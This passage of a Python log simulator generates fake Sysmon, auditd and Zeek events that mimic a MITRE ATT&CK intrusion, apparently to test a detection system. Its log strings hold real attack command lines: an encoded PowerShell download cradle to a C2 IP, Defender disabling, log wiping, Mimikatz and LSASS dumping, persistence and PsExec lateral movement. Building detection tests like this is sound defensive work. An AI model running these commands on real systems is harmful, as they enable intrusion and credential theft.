"""
高级日志模拟器 - 全面测试 FusionTrace 系统功能

功能特性：
1. 多主机/资产模拟 - 测试资产自动发现功能
2. 完整 MITRE ATT&CK 攻击链覆盖
3. 多攻击者/多目标并行攻击场景
4. Windows Sysmon + Linux Auditd 混合日志
5. 支持多种测试模式（攻击链/压力测试/边界测试/演示模式）
6. 可配置的攻击场景和时间线

使用方法：
    python advanced_log_simulator.py [模式] [间隔秒数]
    
    模式：
    - full_chain: 完整攻击链演示（默认）
    - stress: 压力测试（大量日志）
    - discovery: 资产发现测试（新主机上线）
    - lateral: 横向移动专项测试
    - exfil: 数据外泄专项测试
    - demo: 演示模式（慢速、有序）
"""

import asyncio
import json
import random
import string
import hashlib
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

# ==========================================
# 配置
# ==========================================

# 日志文件路径（Linux部署用）
# LOG_PATHS = {
#     "wazuh": Path("/var/lib/docker/volumes/single-node_wazuh_logs/_data/alerts/alerts.json"),
#     "zeek_conn": Path("/home/Ariadne/data/logs/zeek/conn.json"),
#     "zeek_dns": Path("/home/Ariadne/data/logs/zeek/dns.log"),
#     "zeek_http": Path("/home/Ariadne/data/logs/zeek/http.log"),
#     "zeek_files": Path("/home/Ariadne/data/logs/zeek/files.log"),
# }

# 日志文件路径（Windows本地测试用）
LOG_PATHS = {
    "wazuh": Path("D:/Projects/Python/Courses/Ariadne/data/logs/wazuh/archives.json"),
    "zeek_conn": Path("D:/Projects/Python/Courses/Ariadne/data/logs/zeek/conn.json"),
    "zeek_dns": Path("D:/Projects/Python/Courses/Ariadne/data/logs/zeek/dns.log"),
    "zeek_http": Path("D:/Projects/Python/Courses/Ariadne/data/logs/zeek/http.log"),
    "zeek_files": Path("D:/Projects/Python/Courses/Ariadne/data/logs/zeek/files.log"),
}


class TestMode(Enum):
    """测试模式"""
    FULL_CHAIN = "full_chain"      # 完整攻击链
    STRESS = "stress"              # 压力测试
    DISCOVERY = "discovery"        # 资产发现测试
    LATERAL = "lateral"            # 横向移动测试
    EXFIL = "exfil"               # 数据外泄测试
    DEMO = "demo"                  # 演示模式


# ==========================================
# 数据模型
# ==========================================

@dataclass
class Host:
    """主机/资产定义"""
    id: str
    name: str
    ip: str
    os: str  # windows/linux
    role: str  # Server/Sensor/Victim/Attacker
    status: str = "online"
    services: List[str] = field(default_factory=list)
    
    
@dataclass 
class Attacker:
    """攻击者定义"""
    id: str
    name: str
    ip: str
    apt_group: Optional[str] = None
    techniques: List[str] = field(default_factory=list)


@dataclass
class AttackScenario:
    """攻击场景"""
    name: str
    mitre_tactic: str
    mitre_technique: str
    description: str
    source_host: Host
    target_host: Optional[Host] = None


# ==========================================
# 模拟环境
# ==========================================

class SimulatedEnvironment:
    """模拟环境 - 管理所有主机和攻击者"""
    
    def __init__(self):
        self.hosts: Dict[str, Host] = {}
        self.attackers: Dict[str, Attacker] = {}
        self.compromised_hosts: List[str] = []
        self.c2_servers: List[str] = []
        self.pid_counter: int = 1000
        self.attack_timeline: List[Dict] = []
        
        self._init_environment()
    
    def _init_environment(self):
        """初始化模拟环境"""
        # ========== 内部主机 ==========
        # 服务器
        self.hosts["srv-01"] = Host(
            id="001", name="AD-Server", ip="192.168.1.10",
            os="windows", role="Server",
            services=["ldap", "kerberos", "dns"]
        )
        self.hosts["srv-02"] = Host(
            id="002", name="WebServer-01", ip="192.168.1.20",
            os="windows", role="Server",
            services=["http", "https", "iis"]
        )
        self.hosts["srv-03"] = Host(
            id="003", name="DB-Server", ip="192.168.1.30",
            os="linux", role="Server",
            services=["mysql", "ssh"]
        )
        self.hosts["srv-04"] = Host(
            id="004", name="FileServer", ip="192.168.1.40",
            os="windows", role="Server",
            services=["smb", "cifs"]
        )
        self.hosts["srv-05"] = Host(
            id="005", name="Mail-Server", ip="192.168.1.50",
            os="linux", role="Server",
            services=["smtp", "imap", "pop3"]
        )
        
        # 传感器/安全设备
        self.hosts["sensor-01"] = Host(
            id="010", name="Zeek-Sensor", ip="192.168.1.3",
            os="linux", role="Sensor",
            services=["zeek"]
        )
        self.hosts["sensor-02"] = Host(
            id="011", name="FusionTrace-Server", ip="192.168.1.2",
            os="linux", role="Server",
            services=["neo4j", "api"]
        )
        
        # 工作站/终端
        self.hosts["ws-01"] = Host(
            id="101", name="IT-Admin-PC", ip="192.168.1.101",
            os="windows", role="Victim",
            services=[]
        )
        self.hosts["ws-02"] = Host(
            id="102", name="HR-PC-01", ip="192.168.1.102",
            os="windows", role="Victim",
            services=[]
        )
        self.hosts["ws-03"] = Host(
            id="103", name="Finance-PC", ip="192.168.1.103",
            os="windows", role="Victim",
            services=[]
        )
        self.hosts["ws-04"] = Host(
            id="104", name="Dev-Linux", ip="192.168.1.104",
            os="linux", role="Victim",
            services=["ssh", "docker"]
        )
        self.hosts["ws-05"] = Host(
            id="105", name="CEO-Laptop", ip="192.168.1.105",
            os="windows", role="Victim",
            services=[]
        )
        
        # ========== 攻击者 ==========
        self.attackers["apt-28"] = Attacker(
            id="atk-01", name="APT28-Operator",
            ip="45.67.89.100", apt_group="APT28",
            techniques=["T1566", "T1059", "T1003", "T1021", "T1048"]
        )
        self.attackers["apt-29"] = Attacker(
            id="atk-02", name="APT29-Operator",
            ip="91.234.56.78", apt_group="APT29",
            techniques=["T1195", "T1071", "T1027", "T1055", "T1567"]
        )
        self.attackers["generic"] = Attacker(
            id="atk-03", name="GenericAttacker",
            ip="185.123.45.67", apt_group=None,
            techniques=["T1110", "T1190", "T1059"]
        )
        
        # C2 服务器
        self.c2_servers = [
            "45.67.89.123",
            "91.234.56.99",
            "185.100.200.50",
            "c2.evil-domain.net",
            "beacon.apt-c2.com"
        ]
    
    def get_next_pid(self) -> int:
        """获取下一个进程ID"""
        self.pid_counter += 1
        return self.pid_counter
    
    def compromise_host(self, host_key: str):
        """标记主机为已沦陷"""
        if host_key not in self.compromised_hosts:
            self.compromised_hosts.append(host_key)
            self.hosts[host_key].status = "compromised"
    
    def get_random_host(self, role: Optional[str] = None, 
                        os: Optional[str] = None,
                        exclude_compromised: bool = False) -> Host:
        """随机获取一个主机"""
        candidates = list(self.hosts.values())
        if role:
            candidates = [h for h in candidates if h.role == role]
        if os:
            candidates = [h for h in candidates if h.os == os]
        if exclude_compromised:
            candidates = [h for h in candidates if h.id not in self.compromised_hosts]
        return random.choice(candidates) if candidates else list(self.hosts.values())[0]
    
    def get_random_attacker(self) -> Attacker:
        """随机获取一个攻击者"""
        return random.choice(list(self.attackers.values()))
    
    def get_random_c2(self) -> str:
        """随机获取一个C2地址"""
        return random.choice(self.c2_servers)


# ==========================================
# 日志生成器
# ==========================================

class LogGenerator:
    """日志生成器 - 生成各种类型的日志"""
    
    def __init__(self, env: SimulatedEnvironment):
        self.env = env
        self.process_tree: Dict[str, int] = {}  # host_id -> parent_pid
    
    def generate_uid(self, prefix: str = "C") -> str:
        """生成 Zeek 风格的 UID"""
        return f"{prefix}{''.join(random.choices(string.ascii_letters + string.digits, k=17))}"
    
    def generate_hash(self, seed: str = "") -> str:
        """生成文件哈希"""
        content = seed + str(random.random())
        return hashlib.sha256(content.encode()).hexdigest()
    
    def get_timestamp(self) -> str:
        """获取当前时间戳（Wazuh格式）"""
        return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S+0000")
    
    def get_epoch_timestamp(self) -> float:
        """获取当前时间戳（Zeek格式）"""
        return datetime.now(timezone.utc).timestamp()
    
    # ==========================================
    # Wazuh 日志生成
    # ==========================================
    
    def wazuh_process_create_windows(self, host: Host, 
                                      process_name: str,
                                      process_path: str,
                                      command_line: str,
                                      parent_process: str = "explorer.exe",
                                      parent_pid: int = 1000,
                                      user: str = "NT AUTHORITY\\SYSTEM",
                                      rule_level: int = 10,
                                      rule_id: str = "100001",
                                      rule_desc: str = "Process created",
                                      rule_groups: List[str] = None) -> str:
        """生成 Windows Sysmon Event ID 1 (进程创建) 日志"""
        pid = self.env.get_next_pid()
        self.process_tree[host.id] = pid
        
        return json.dumps({
            "timestamp": self.get_timestamp(),
            "rule": {
                "level": rule_level,
                "description": rule_desc,
                "id": rule_id,
                "groups": rule_groups or ["windows", "sysmon", "process"]
            },
            "agent": {
                "id": host.id,
                "name": host.name,
                "ip": host.ip
            },
            "data": {
                "win": {
                    "eventdata": {
                        "image": process_path,
                        "processId": str(pid),
                        "parentProcessId": str(parent_pid),
                        "parentImage": f"C:\\Windows\\{parent_process}" if "\\" not in parent_process else parent_process,
                        "commandLine": command_line,
                        "user": user,
                        "currentDirectory": "C:\\Windows\\System32",
                        "hashes": f"SHA256={self.generate_hash(process_name)}",
                        "processGuid": f"{{{self.generate_uid('P')}}}"
                    },
                    "system": {
                        "eventID": "1",
                        "computer": host.name
                    }
                }
            }
        }, ensure_ascii=False)
    
    def wazuh_network_connect_windows(self, host: Host,
                                       process_name: str,
                                       dst_ip: str,
                                       dst_port: int,
                                       rule_level: int = 8,
                                       rule_groups: List[str] = None) -> str:
        """生成 Windows Sysmon Event ID 3 (网络连接) 日志"""
        pid = self.process_tree.get(host.id, self.env.get_next_pid())
        
        return json.dumps({
            "timestamp": self.get_timestamp(),
            "rule": {
                "level": rule_level,
                "description": f"Network connection from {process_name}",
                "id": "100003",
                "groups": rule_groups or ["windows", "sysmon", "network"]
            },
            "agent": {
                "id": host.id,
                "name": host.name,
                "ip": host.ip
            },
            "data": {
                "win": {
                    "eventdata": {
                        "image": f"C:\\{process_name}" if "\\" not in process_name else process_name,
                        "processId": str(pid),
                        "sourceIp": host.ip,
                        "sourcePort": str(random.randint(49152, 65535)),
                        "destinationIp": dst_ip,
                        "destinationPort": str(dst_port),
                        "protocol": "tcp",
                        "user": "NT AUTHORITY\\SYSTEM"
                    },
                    "system": {
                        "eventID": "3",
                        "computer": host.name
                    }
                }
            }
        }, ensure_ascii=False)
    
    def wazuh_file_create_windows(self, host: Host,
                                   target_file: str,
                                   process_name: str = "explorer.exe",
                                   rule_level: int = 7) -> str:
        """生成 Windows Sysmon Event ID 11 (文件创建) 日志"""
        pid = self.process_tree.get(host.id, self.env.get_next_pid())
        
        return json.dumps({
            "timestamp": self.get_timestamp(),
            "rule": {
                "level": rule_level,
                "description": f"File created: {target_file}",
                "id": "100011",
                "groups": ["windows", "sysmon", "file"]
            },
            "agent": {
                "id": host.id,
                "name": host.name,
                "ip": host.ip
            },
            "data": {
                "win": {
                    "eventdata": {
                        "image": f"C:\\{process_name}" if "\\" not in process_name else process_name,
                        "processId": str(pid),
                        "targetFilename": target_file,
                        "user": "NT AUTHORITY\\SYSTEM"
                    },
                    "system": {
                        "eventID": "11",
                        "computer": host.name
                    }
                }
            }
        }, ensure_ascii=False)
    
    def wazuh_linux_auditd(self, host: Host,
                           command: str,
                           exe_path: str,
                           args: List[str],
                           ppid: int = 1,
                           user: str = "root",
                           rule_level: int = 10,
                           rule_groups: List[str] = None) -> str:
        """生成 Linux Auditd 日志"""
        pid = self.env.get_next_pid()
        self.process_tree[host.id] = pid
        
        return json.dumps({
            "timestamp": self.get_timestamp(),
            "rule": {
                "level": rule_level,
                "description": f"Command executed: {command}",
                "id": "200001",
                "groups": rule_groups or ["audit", "linux", "process"]
            },
            "agent": {
                "id": host.id,
                "name": host.name,
                "ip": host.ip
            },
            "data": {
                "audit": {
                    "type": "execve",
                    "command": command,
                    "pid": str(pid),
                    "ppid": str(ppid),
                    "exe": exe_path,
                    "uid": "0" if user == "root" else "1000",
                    "euid": "0" if user == "root" else "1000",
                    "auid_user": user,
                    "cwd": "/root" if user == "root" else f"/home/{user}",
                    "execve_args": args
                }
            }
        }, ensure_ascii=False)
    
    def wazuh_syscheck(self, host: Host,
                        file_path: str,
                        event_type: str = "modified",
                        rule_level: int = 7) -> str:
        """生成 Wazuh Syscheck (FIM) 日志"""
        return json.dumps({
            "timestamp": self.get_timestamp(),
            "rule": {
                "level": rule_level,
                "description": f"File {event_type}: {file_path}",
                "id": "550",
                "groups": ["syscheck", "file_integrity"]
            },
            "agent": {
                "id": host.id,
                "name": host.name,
                "ip": host.ip
            },
            "syscheck": {
                "path": file_path,
                "event": event_type,
                "sha256_after": self.generate_hash(file_path),
                "md5_after": hashlib.md5(file_path.encode()).hexdigest(),
                "size_after": random.randint(1024, 1048576),
                "uname_after": "root" if host.os == "linux" else "SYSTEM",
                "perm_after": "rw-r--r--" if host.os == "linux" else None
            }
        }, ensure_ascii=False)
    
    # ==========================================
    # Zeek 日志生成
    # ==========================================
    
    def zeek_conn(self, src_ip: str, src_port: int,
                  dst_ip: str, dst_port: int,
                  proto: str = "tcp",
                  conn_state: str = "SF",
                  duration: float = None,
                  orig_bytes: int = None,
                  resp_bytes: int = None) -> str:
        """生成 Zeek conn.log"""
        return json.dumps({
            "ts": self.get_epoch_timestamp(),
            "uid": self.generate_uid("C"),
            "id.orig_h": src_ip,
            "id.orig_p": src_port,
            "id.resp_h": dst_ip,
            "id.resp_p": dst_port,
            "proto": proto,
            "conn_state": conn_state,
            "duration": duration or round(random.uniform(0.1, 60.0), 2),
            "orig_bytes": orig_bytes or random.randint(100, 10000),
            "resp_bytes": resp_bytes or random.randint(100, 50000)
        })
    
    def zeek_dns(self, src_ip: str, dns_server: str,
                 query: str, answers: List[str] = None,
                 qtype: str = "A") -> str:
        """生成 Zeek dns.log"""
        return json.dumps({
            "ts": self.get_epoch_timestamp(),
            "uid": self.generate_uid("D"),
            "id.orig_h": src_ip,
            "id.orig_p": random.randint(49152, 65535),
            "id.resp_h": dns_server,
            "id.resp_p": 53,
            "proto": "udp",
            "query": query,
            "qtype_name": qtype,
            "answers": answers or [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"]
        })
    
    def zeek_http(self, src_ip: str, dst_ip: str,
                  method: str, host: str, uri: str,
                  user_agent: str = "Mozilla/5.0",
                  status_code: int = 200,
                  dst_port: int = 80) -> str:
        """生成 Zeek http.log"""
        return json.dumps({
            "ts": self.get_epoch_timestamp(),
            "uid": self.generate_uid("H"),
            "id.orig_h": src_ip,
            "id.orig_p": random.randint(49152, 65535),
            "id.resp_h": dst_ip,
            "id.resp_p": dst_port,
            "proto": "tcp",
            "method": method,
            "host": host,
            "uri": uri,
            "user_agent": user_agent,
            "status_code": status_code
        })
    
    def zeek_files(self, src_ip: str, dst_ip: str,
                   mime_type: str,
                   seen_bytes: int,
                   source: str = "HTTP",
                   dst_port: int = 80) -> str:
        """生成 Zeek files.log"""
        return json.dumps({
            "ts": self.get_epoch_timestamp(),
            "fuid": self.generate_uid("F"),
            "uid": self.generate_uid("C"),
            "id.orig_h": src_ip,
            "id.orig_p": random.randint(49152, 65535),
            "id.resp_h": dst_ip,
            "id.resp_p": dst_port,
            "source": source,
            "depth": 0,
            "analyzers": [],
            "mime_type": mime_type,
            "duration": round(random.uniform(0.1, 30.0), 2),
            "is_orig": False,
            "seen_bytes": seen_bytes,
            "total_bytes": seen_bytes,
            "missing_bytes": 0,
            "overflow_bytes": 0,
            "timedout": False
        })


# ==========================================
# 攻击场景模拟器
# ==========================================

class AttackSimulator:
    """攻击场景模拟器"""
    
    def __init__(self, env: SimulatedEnvironment, log_gen: LogGenerator):
        self.env = env
        self.log = log_gen
        self.logs_buffer: Dict[str, List[str]] = {
            "wazuh": [],
            "zeek_conn": [],
            "zeek_dns": [],
            "zeek_http": [],
            "zeek_files": []
        }
    
    def clear_buffer(self):
        """清空日志缓冲"""
        for key in self.logs_buffer:
            self.logs_buffer[key] = []
    
    def flush_to_files(self):
        """将缓冲写入文件"""
        for log_type, logs in self.logs_buffer.items():
            if logs:
                with open(LOG_PATHS[log_type], 'a', encoding='utf-8') as f:
                    for log in logs:
                        f.write(log + '\n')
    
    # ==========================================
    # MITRE ATT&CK 各阶段攻击模拟
    # ==========================================
    
    def initial_access_phishing(self, target: Host, attacker: Attacker):
        """
        初始访问 - 钓鱼攻击 (T1566)
        模拟：用户打开恶意文档 -> 宏执行 -> 下载后门
        """
        # 1. 恶意文档打开
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=target,
                process_name="WINWORD.EXE",
                process_path="C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                command_line="WINWORD.EXE /n \"C:\\Users\\victim\\Downloads\\Invoice_2024.docm\"",
                parent_process="explorer.exe",
                user=f"{target.name}\\user",
                rule_level=5,
                rule_desc="Microsoft Word opened document"
            )
        )
        
        parent_pid = self.env.pid_counter
        
        # 2. 宏执行 PowerShell
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=target,
                process_name="powershell.exe",
                process_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                command_line="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                parent_process="WINWORD.EXE",
                parent_pid=parent_pid,
                user=f"{target.name}\\user",
                rule_level=14,
                rule_id="100201",
                rule_desc="Suspicious PowerShell execution from Office application",
                rule_groups=["attack", "execution", "T1059.001", "initial_access"]
            )
        )
        
        # 3. 网络连接下载载荷
        c2 = self.env.get_random_c2()
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_network_connect_windows(
                host=target,
                process_name="powershell.exe",
                dst_ip=c2 if "." in c2 else "45.67.89.123",
                dst_port=80,
                rule_level=12,
                rule_groups=["attack", "c2", "T1071"]
            )
        )
        
        # 4. Zeek 捕获 HTTP 下载
        self.logs_buffer["zeek_http"].append(
            self.log.zeek_http(
                src_ip=target.ip,
                dst_ip="45.67.89.123",
                method="GET",
                host="45.67.89.123",
                uri="/payload.ps1",
                user_agent="PowerShell"
            )
        )
        
        # 5. Zeek 文件传输
        self.logs_buffer["zeek_files"].append(
            self.log.zeek_files(
                src_ip=target.ip,
                dst_ip="45.67.89.123",
                mime_type="text/plain",
                seen_bytes=random.randint(10240, 102400)
            )
        )
        
        self.env.compromise_host(self._get_host_key(target))
    
    def execution_command_shell(self, host: Host):
        """
        执行 - 命令和脚本解释器 (T1059)
        """
        if host.os == "windows":
            # cmd.exe 执行
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_process_create_windows(
                    host=host,
                    process_name="cmd.exe",
                    process_path="C:\\Windows\\System32\\cmd.exe",
                    command_line="cmd.exe /c whoami /all",
                    parent_process="powershell.exe",
                    parent_pid=self.log.process_tree.get(host.id, 1000),
                    rule_level=10,
                    rule_id="100301",
                    rule_desc="Command shell execution",
                    rule_groups=["attack", "execution", "T1059.003"]
                )
            )
        else:
            # Linux bash 执行
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_linux_auditd(
                    host=host,
                    command="bash",
                    exe_path="/bin/bash",
                    args=["bash", "-c", "id; uname -a; cat /etc/passwd"],
                    rule_level=10,
                    rule_groups=["attack", "execution", "T1059.004"]
                )
            )
    
    def persistence_registry_run_key(self, host: Host):
        """
        持久化 - 注册表运行键 (T1547.001)
        """
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=host,
                process_name="reg.exe",
                process_path="C:\\Windows\\System32\\reg.exe",
                command_line='reg.exe add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\ProgramData\\update.exe" /f',
                parent_process="cmd.exe",
                parent_pid=self.log.process_tree.get(host.id, 1000),
                rule_level=12,
                rule_id="100401",
                rule_desc="Registry Run key modification for persistence",
                rule_groups=["attack", "persistence", "T1547.001"]
            )
        )
    
    def persistence_scheduled_task(self, host: Host):
        """
        持久化 - 计划任务 (T1053.005)
        """
        if host.os == "windows":
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_process_create_windows(
                    host=host,
                    process_name="schtasks.exe",
                    process_path="C:\\Windows\\System32\\schtasks.exe",
                    command_line='schtasks.exe /create /sc minute /mo 30 /tn "SystemHealthCheck" /tr "C:\\ProgramData\\health.exe"',
                    parent_process="cmd.exe",
                    parent_pid=self.log.process_tree.get(host.id, 1000),
                    rule_level=11,
                    rule_id="100402",
                    rule_desc="Scheduled task created for persistence",
                    rule_groups=["attack", "persistence", "T1053.005"]
                )
            )
        else:
            # Linux cron
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_linux_auditd(
                    host=host,
                    command="crontab",
                    exe_path="/usr/bin/crontab",
                    args=["crontab", "-l"],
                    rule_level=8
                )
            )
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_syscheck(
                    host=host,
                    file_path="/var/spool/cron/crontabs/root",
                    event_type="modified",
                    rule_level=10
                )
            )
    
    def privilege_escalation_token_manipulation(self, host: Host):
        """
        权限提升 - 访问令牌操作 (T1134)
        """
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=host,
                process_name="token_steal.exe",
                process_path="C:\\Temp\\token_steal.exe",
                command_line="token_steal.exe --impersonate SYSTEM",
                parent_process="cmd.exe",
                parent_pid=self.log.process_tree.get(host.id, 1000),
                user="NT AUTHORITY\\SYSTEM",
                rule_level=14,
                rule_id="100501",
                rule_desc="Possible token manipulation detected",
                rule_groups=["attack", "privilege_escalation", "T1134"]
            )
        )
    
    def defense_evasion_disable_defender(self, host: Host):
        """
        防御规避 - 禁用安全工具 (T1562.001)
        """
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=host,
                process_name="powershell.exe",
                process_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                command_line="powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
                parent_process="cmd.exe",
                parent_pid=self.log.process_tree.get(host.id, 1000),
                rule_level=15,
                rule_id="100601",
                rule_desc="Windows Defender disabled",
                rule_groups=["attack", "defense_evasion", "T1562.001"]
            )
        )
    
    def defense_evasion_clear_logs(self, host: Host):
        """
        防御规避 - 清除日志 (T1070.001)
        """
        if host.os == "windows":
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_process_create_windows(
                    host=host,
                    process_name="wevtutil.exe",
                    process_path="C:\\Windows\\System32\\wevtutil.exe",
                    command_line="wevtutil.exe cl Security",
                    parent_process="cmd.exe",
                    parent_pid=self.log.process_tree.get(host.id, 1000),
                    rule_level=15,
                    rule_id="100602",
                    rule_desc="Security event log cleared",
                    rule_groups=["attack", "defense_evasion", "T1070.001"]
                )
            )
        else:
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_linux_auditd(
                    host=host,
                    command="rm",
                    exe_path="/bin/rm",
                    args=["rm", "-rf", "/var/log/auth.log", "/var/log/syslog"],
                    rule_level=15,
                    rule_groups=["attack", "defense_evasion", "T1070.002"]
                )
            )
    
    def credential_access_mimikatz(self, host: Host):
        """
        凭据访问 - Mimikatz (T1003.001)
        """
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=host,
                process_name="mimikatz.exe",
                process_path="C:\\Temp\\mimikatz.exe",
                command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
                parent_process="cmd.exe",
                parent_pid=self.log.process_tree.get(host.id, 1000),
                rule_level=15,
                rule_id="100701",
                rule_desc="Mimikatz credential dumping detected",
                rule_groups=["attack", "credential_access", "T1003.001", "mimikatz"]
            )
        )
    
    def credential_access_lsass_dump(self, host: Host):
        """
        凭据访问 - LSASS 内存转储 (T1003.001)
        """
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=host,
                process_name="procdump.exe",
                process_path="C:\\Temp\\procdump.exe",
                command_line="procdump.exe -ma lsass.exe lsass.dmp",
                parent_process="cmd.exe",
                parent_pid=self.log.process_tree.get(host.id, 1000),
                rule_level=15,
                rule_id="100702",
                rule_desc="LSASS memory dump attempted",
                rule_groups=["attack", "credential_access", "T1003.001"]
            )
        )
        
        # 文件创建
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_file_create_windows(
                host=host,
                target_file="C:\\Temp\\lsass.dmp",
                process_name="procdump.exe",
                rule_level=15
            )
        )
    
    def discovery_system_info(self, host: Host):
        """
        发现 - 系统信息发现 (T1082)
        """
        if host.os == "windows":
            commands = [
                ("systeminfo.exe", "systeminfo.exe"),
                ("ipconfig.exe", "ipconfig.exe /all"),
                ("net.exe", "net.exe user"),
                ("net.exe", "net.exe localgroup administrators"),
                ("tasklist.exe", "tasklist.exe /v"),
            ]
            for proc, cmd in commands:
                self.logs_buffer["wazuh"].append(
                    self.log.wazuh_process_create_windows(
                        host=host,
                        process_name=proc,
                        process_path=f"C:\\Windows\\System32\\{proc}",
                        command_line=cmd,
                        parent_process="cmd.exe",
                        parent_pid=self.log.process_tree.get(host.id, 1000),
                        rule_level=6,
                        rule_desc=f"System discovery: {proc}",
                        rule_groups=["attack", "discovery", "T1082"]
                    )
                )
        else:
            commands = [
                ("id", "/usr/bin/id", ["id"]),
                ("uname", "/bin/uname", ["uname", "-a"]),
                ("cat", "/bin/cat", ["cat", "/etc/passwd"]),
                ("ps", "/bin/ps", ["ps", "aux"]),
                ("netstat", "/bin/netstat", ["netstat", "-tulpn"]),
            ]
            for cmd, path, args in commands:
                self.logs_buffer["wazuh"].append(
                    self.log.wazuh_linux_auditd(
                        host=host,
                        command=cmd,
                        exe_path=path,
                        args=args,
                        rule_level=6,
                        rule_groups=["attack", "discovery", "T1082"]
                    )
                )
    
    def lateral_movement_psexec(self, source: Host, target: Host):
        """
        横向移动 - PsExec (T1021.002)
        """
        # 1. PsExec 执行
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=source,
                process_name="PsExec.exe",
                process_path="C:\\Tools\\PsExec.exe",
                command_line=f"PsExec.exe \\\\{target.ip} -u administrator -p P@ssw0rd123 cmd.exe",
                parent_process="cmd.exe",
                parent_pid=self.log.process_tree.get(source.id, 1000),
                rule_level=12,
                rule_id="100801",
                rule_desc="PsExec lateral movement detected",
                rule_groups=["attack", "lateral_movement", "T1021.002"]
            )
        )
        
        # 2. 网络连接 (SMB)
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_network_connect_windows(
                host=source,
                process_name="PsExec.exe",
                dst_ip=target.ip,
                dst_port=445,
                rule_level=10,
                rule_groups=["attack", "lateral_movement"]
            )
        )
        
        # 3. Zeek SMB 连接
        self.logs_buffer["zeek_conn"].append(
            self.log.zeek_conn(
                src_ip=source.ip,
                src_port=random.randint(49152, 65535),
                dst_ip=target.ip,
                dst_port=445,
                duration=random.uniform(5.0, 60.0),
                orig_bytes=random.randint(5000, 50000),
                resp_bytes=random.randint(2000, 20000)
            )
        )
        
        # 4. 目标主机上的进程创建
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=target,
                process_name="PSEXESVC.exe",
                process_path="C:\\Windows\\PSEXESVC.exe",
                command_line="PSEXESVC.exe",
                parent_process="services.exe",
                rule_level=10,
                rule_desc="PsExec service started on target",
                rule_groups=["attack", "lateral_movement"]
            )
        )
        
        self.env.compromise_host(self._get_host_key(target))
    
    def lateral_movement_ssh(self, source: Host, target: Host):
        """
        横向移动 - SSH (T1021.004)
        """
        # Linux SSH
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_linux_auditd(
                host=source,
                command="ssh",
                exe_path="/usr/bin/ssh",
                args=["ssh", f"root@{target.ip}"],
                rule_level=8,
                rule_groups=["attack", "lateral_movement", "T1021.004"]
            )
        )
        
        # Zeek SSH 连接
        self.logs_buffer["zeek_conn"].append(
            self.log.zeek_conn(
                src_ip=source.ip,
                src_port=random.randint(49152, 65535),
                dst_ip=target.ip,
                dst_port=22,
                duration=random.uniform(60.0, 3600.0),
                orig_bytes=random.randint(10000, 500000),
                resp_bytes=random.randint(5000, 200000)
            )
        )
        
        self.env.compromise_host(self._get_host_key(target))
    
    def lateral_movement_wmi(self, source: Host, target: Host):
        """
        横向移动 - WMI (T1047)
        """
        self.logs_buffer["wazuh"].append(
            self.log.wazuh_process_create_windows(
                host=source,
                process_name="wmic.exe",
                process_path="C:\\Windows\\System32\\wbem\\wmic.exe",
                command_line=f'wmic.exe /node:"{target.ip}" process call create "cmd.exe /c whoami > C:\\temp\\out.txt"',
                parent_process="cmd.exe",
                parent_pid=self.log.process_tree.get(source.id, 1000),
                rule_level=12,
                rule_id="100803",
                rule_desc="WMI remote execution detected",
                rule_groups=["attack", "lateral_movement", "T1047"]
            )
        )
        
        # WMI 使用 DCOM (port 135) 和动态端口
        self.logs_buffer["zeek_conn"].append(
            self.log.zeek_conn(
                src_ip=source.ip,
                src_port=random.randint(49152, 65535),
                dst_ip=target.ip,
                dst_port=135,
                duration=random.uniform(1.0, 10.0)
            )
        )
        
        self.env.compromise_host(self._get_host_key(target))
    
    def collection_archive_data(self, host: Host):
        """
        收集 - 数据归档 (T1560)
        """
        if host.os == "windows":
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_process_create_windows(
                    host=host,
                    process_name="7z.exe",
                    process_path="C:\\Program Files\\7-Zip\\7z.exe",
                    command_line='7z.exe a -p"password123" C:\\Temp\\data.7z C:\\Users\\*\\Documents',
                    parent_process="cmd.exe",
                    parent_pid=self.log.process_tree.get(host.id, 1000),
                    rule_level=10,
                    rule_id="100901",
                    rule_desc="Data archiving for exfiltration",
                    rule_groups=["attack", "collection", "T1560"]
                )
            )
        else:
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_linux_auditd(
                    host=host,
                    command="tar",
                    exe_path="/bin/tar",
